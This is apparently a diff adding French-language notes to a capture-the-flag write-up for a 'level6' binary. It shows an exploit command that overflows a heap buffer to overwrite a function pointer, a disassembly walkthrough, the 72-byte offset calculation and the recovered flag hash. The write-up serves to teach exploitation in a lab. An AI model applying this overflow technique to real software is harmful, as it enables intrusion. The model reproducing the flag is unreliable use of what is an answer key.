@@ -28,3 +28,34 @@ r $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
 
 ./level6 $(python -c 'print "a"*72 + "\x54\x84\x04\x08"') 
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+
+
+
+more:
+	<main>
+		ebp - 0x20 	stack + 0x20
+		[esp + 0x1c] 	= malloc(0x40)	= 0x804a050		_1_
+		[esp + 0x18]	= malloc(0x4)	= 0x804a008		_2_
+		=== pour strcpy======
+		edx = function <m>
+		eax = _2_
+		[eax] = edx = <m>
+		eax = [ebp + 0xc]	= "/home/user/level6/level6" = &arv[0]
+		eax += 0x4		=> &arv[1]
+		eax = [eax]		=> arv[1]
+		eax = _1_
+		[esp] = eax = _1_
+		strcpy(eax,edx) =  strcpy(_1_, arv[1])			####_BINGO_#### On peut ecrire sur la stack !
+		eax = _2_
+		eax = [eax]
+		call eax						####__BINGO__### Un call d'une value de la stack !!
+
+
+Afin d'ecrire dans _2_ il faut calculer la difference entre l'adresse (start) du malloc _1_ et _2_
+
+p 0x804a050 - 0x804a008
+$2 = 0x48 = 72
+
+On retrouve bien notre offset
+
